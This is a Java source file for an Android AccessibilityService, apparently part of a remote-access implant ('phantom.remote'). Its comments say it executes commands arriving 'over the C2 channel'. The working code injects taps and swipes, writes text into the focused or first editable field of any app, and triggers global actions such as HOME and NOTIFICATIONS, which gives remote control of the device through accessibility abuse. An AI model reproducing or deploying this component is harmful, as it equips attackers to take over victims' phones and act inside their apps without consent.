package com.phantom.remote;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.graphics.Path;
import android.os.Bundle;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

/**
 * Input-injection primitive for the Android remote module.
 *
 * The desktop module injects through Win32 / X11. Android has no such API for
 * third-party apps: the only supported path is an AccessibilityService, which
 * is why the module declares one. Grading:
 *
 *   tap / swipe  -> dispatchGesture (works on every non-rooted device)
 *   text         -> ACTION_SET_TEXT on the focused node
 *   key          -> performGlobalAction (BACK/HOME/RECENTS/NOTIFICATIONS) or
 *                   KEYCODE_ENTER/KEYCODE_DEL via ACTION_*_TEXT on a node
 *
 * The service keeps a static reference so {@link RemoteService} can call
 * {@link #dispatch(String)} with commands that arrive over the C2 channel.
 * When the user has not enabled the service, dispatch returns a clear error
 * instead of silently failing.
 */
public class RemoteAccessibilityService extends AccessibilityService {

    private static volatile RemoteAccessibilityService instance;

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        instance = this;
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // No event harvesting: the service is purely an input primitive.
    }

    @Override
    public void onInterrupt() {
    }

    @Override
    public boolean onUnbind(android.content.Intent intent) {
        instance = null;
        return super.onUnbind(intent);
    }

    /** Route a `remote input ...` command to the right Android primitive. */
    public static String dispatch(String args) {
        RemoteAccessibilityService svc = instance;
        if (svc == null) return "REMOTE_ERROR: accessibility service not enabled";
        String[] p = args.trim().split("\\s+");
        if (p.length == 0 || p[0].isEmpty()) {
            return "Usage: remote input <tap|swipe|text|key> ...";
        }
        switch (p[0]) {
            case "tap": {
                if (p.length < 3) return "Usage: remote input tap <x> <y>";
                return svc.tap(parse(p[1]), parse(p[2]));
            }
            case "swipe": {
                if (p.length < 5) return "Usage: remote input swipe <x1> <y1> <x2> <y2>";
                return svc.swipe(parse(p[1]), parse(p[2]), parse(p[3]), parse(p[4]));
            }
            case "text": {
                // everything after the subcommand is the literal text
                String text = args.trim().substring(4).trim();
                return svc.setText(text);
            }
            case "key": {
                if (p.length < 2) return "Usage: remote input key <name>";
                return svc.globalKey(p[1]);
            }
            // desktop-compatible aliases: `click <x> <y>` = tap, `type` = text
            case "click": {
                if (p.length < 3) return "Usage: remote input click <x> <y>";
                return svc.tap(parse(p[1]), parse(p[2]));
            }
            case "type": {
                String text = args.trim().substring(4).trim();
                return svc.setText(text);
            }
            default:
                return "Usage: remote input <tap|swipe|text|key> ...";
        }
    }

    private static int parse(String s) {
        try {
            return Integer.parseInt(s);
        } catch (NumberFormatException e) {
            return 0;
        }
    }

    private String tap(float x, float y) {
        Path path = new Path();
        path.moveTo(x, y);
        GestureDescription.StrokeDescription stroke =
                new GestureDescription.StrokeDescription(path, 0, 40);
        return dispatchGesture(new GestureDescription.Builder().addStroke(stroke).build(), null, null)
                ? "tap " + (int) x + "," + (int) y : "REMOTE_ERROR: tap rejected";
    }

    private String swipe(float x1, float y1, float x2, float y2) {
        Path path = new Path();
        path.moveTo(x1, y1);
        path.lineTo(x2, y2);
        GestureDescription.StrokeDescription stroke =
                new GestureDescription.StrokeDescription(path, 0, 250);
        return dispatchGesture(new GestureDescription.Builder().addStroke(stroke).build(), null, null)
                ? "swipe" : "REMOTE_ERROR: swipe rejected";
    }

    private String setText(String text) {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return "REMOTE_ERROR: no active window";
        AccessibilityNodeInfo focused = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
        if (focused == null) {
            focused = firstEditable(root);   // no field focused -> first editable one
        }
        if (focused == null) return "REMOTE_ERROR: no editable field focused";
        Bundle args = new Bundle();
        args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
        return focused.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
                ? "typed " + text.length() + " chars" : "REMOTE_ERROR: text rejected";
    }

    /** Depth-first search for the first editable node (bounded). */
    private static AccessibilityNodeInfo firstEditable(AccessibilityNodeInfo node) {
        if (node == null) return null;
        if (node.isEditable()) return node;
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo found = firstEditable(node.getChild(i));
            if (found != null) return found;
        }
        return null;
    }

    private String globalKey(String name) {
        int action;
        switch (name.toUpperCase()) {
            case "BACK":          action = GLOBAL_ACTION_BACK; break;
            case "HOME":          action = GLOBAL_ACTION_HOME; break;
            case "RECENTS":       action = GLOBAL_ACTION_RECENTS; break;
            case "NOTIFICATIONS": action = GLOBAL_ACTION_NOTIFICATIONS; break;
            case "ENTER":
            case "DEL":
            case "DELETE": {
                AccessibilityNodeInfo root = getRootInActiveWindow();
                AccessibilityNodeInfo focused = root == null ? null
                        : root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
                if (focused == null) return "REMOTE_ERROR: no focused field";
                // ENTER = submit; DEL/DELETE = sendText with a backspace keycode
                if (name.equalsIgnoreCase("ENTER")) {
                    return focused.performAction(AccessibilityNodeInfo.ACTION_IME_ENTER)
                            ? "key ENTER" : "REMOTE_ERROR: key rejected";
                }
                Bundle args = new Bundle();
                String existing = focused.getText() == null ? "" : focused.getText().toString();
                if (existing.isEmpty()) return "key DEL (empty field)";
                args.putCharSequence(
                        AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
                        existing.substring(0, existing.length() - 1));
                return focused.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
                        ? "key DEL" : "REMOTE_ERROR: key rejected";
            }
            default:
                return "REMOTE_ERROR: unknown key " + name;
        }
        return performGlobalAction(action) ? "key " + name : "REMOTE_ERROR: key rejected";
    }
}
